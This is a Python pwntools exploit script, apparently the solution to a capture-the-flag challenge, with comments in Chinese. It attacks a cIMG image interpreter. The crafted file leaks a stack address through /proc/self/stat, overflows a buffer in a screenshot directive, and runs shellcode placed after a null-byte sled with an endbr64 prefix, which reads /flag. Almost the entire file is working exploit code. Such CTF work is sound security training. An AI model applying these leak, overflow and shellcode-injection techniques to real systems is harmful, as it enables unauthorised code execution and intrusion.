import os
import re
import struct
import time

from pwn import *

# Context configuration
context.os = "linux"
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

BIN_PATH = "/challenge/integration-cimg-screenshot-sc"
FLAG_PATH = "/flag"
EXPLOIT_FILE = "/tmp/exploit.cimg"
SC_BIN_FILE = "/tmp/sc.bin"

# CIMG Opcodes
OP_JUMP = 2
OP_RENDER = 4
OP_LOAD_FILE = 5
OP_SHOW = 6
OP_SLEEP = 7


def cimg_header(num_directives, width=255, height=1, version=4):
    return struct.pack("<4sHBBI", b"cIMG", version, width, height, num_directives)


def cimg_load_file(sprite_id, filename, sprite_w=255, sprite_h=1):
    data = struct.pack("<H", OP_LOAD_FILE)
    data += struct.pack("<BBB", sprite_id, sprite_w, sprite_h)
    # 【修复 255 Exit Code】: 无论图片尺寸，CIMG 的路径缓冲区永远是固定的 255 字节！
    data += filename.encode().ljust(255, b"\x00")
    return data


def cimg_render(sprite_id, x=0, y=0, r_off=0, g_off=0, b_off=0, w=255, h=1, channel=0):
    data = struct.pack("<H", OP_RENDER)
    data += struct.pack(
        "<BBBBBBBBB", sprite_id, x, y, r_off, g_off, b_off, w, h, channel
    )
    return data


def cimg_show():
    return struct.pack("<HB", OP_SHOW, 0)


def cimg_sleep(ms):
    return struct.pack("<HI", OP_SLEEP, ms)


def extract_arg_start(output):
    ansi_escape = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
    text = ansi_escape.sub("", output)

    # 提取所有看起来像 x86-64 栈地址的数值 (以 1407 开头)
    stack_addrs = [int(x) for x in re.findall(r"\b1407\d{11,}\b", text)]
    if not stack_addrs:
        return None
    # 第一个 1407 地址即为 arg_start (0x7FFFFFFFxxxx)
    return stack_addrs[0]


def solve():
    if os.path.exists(SC_BIN_FILE):
        os.remove(SC_BIN_FILE)

    # 1. 扩充 Framebuffer 到 500 字节 (250x2)，确保 /proc/self/stat 不被截断
    exp_payload = cimg_header(num_directives=8)
    exp_payload += cimg_load_file(1, "/proc/self/stat", sprite_w=250, sprite_h=2)
    exp_payload += cimg_render(1, w=250, h=2, channel=0)
    exp_payload += cimg_show()

    # 2. 挂起进程，交出 CPU 控制权
    exp_payload += cimg_sleep(2000)

    # 3. 唤醒后，加载并在 Alpha 通道渲染 Shellcode，最后触发截屏溢出与跳转
    exp_payload += cimg_load_file(2, SC_BIN_FILE, sprite_w=250, sprite_h=1)
    exp_payload += cimg_render(2, w=250, h=1, channel=0xFE)
    # 宽度精准设置 144 字节，溢出到 Saved RBX 即止
    exp_payload += struct.pack("<H", 1337) + struct.pack("<BBBBB", 2, 0, 0, 144, 1)
    exp_payload += struct.pack("<H", OP_JUMP)

    write(EXPLOIT_FILE, exp_payload)

    log.info("Firing single-process Exploit chain...")
    io = process([BIN_PATH, EXPLOIT_FILE], env={})

    time.sleep(0.5)
    log.info("Reading unabridged /proc/self/stat...")
    output = io.recv(8192).decode(errors="ignore")

    arg_start = extract_arg_start(output)
    if not arg_start:
        log.error("Failed to parse arg_start. Output dumped.")
        print(output)
        exit(1)

    log.success(f"Leaked arg_start (Top of Stack): {hex(arg_start)}")

    # 【终极算力】：Buffer 位于 arg_start 物理地址下方约 4672 字节处
    buffer_addr = arg_start - 4672
    # 瞄准缓冲区内部偏移 +64 字节处，正中 0x00 滑行道的靶心！
    target_addr = buffer_addr + 64

    log.info(f"Calculated pinpoint target (descending stack): {hex(target_addr)}")

    # 构造 Payload：0x00 作为指令会解析为 add byte ptr [rax], al (完美滑行且避开 IBT 检查干扰)
    endbr64 = b"\xf3\x0f\x1e\xfa"
    shellcode = asm(shellcraft.cat(FLAG_PATH))
    core_sc = endbr64 + shellcode

    sled_len = 136 - len(core_sc)
    sc_payload = (b"\x00" * sled_len) + core_sc

    # 在 136 偏移处精准植入 RBX
    sc_payload += p64(target_addr)
    sc_payload = sc_payload.ljust(250, b"\x00")

    write(SC_BIN_FILE, sc_payload)
    log.success("0x00 Sled & Shellcode deployed! Waiting for interpreter to wake up...")

    res = io.recvall(timeout=3)
    print(res.decode(errors="ignore"))


if __name__ == "__main__":
    solve()
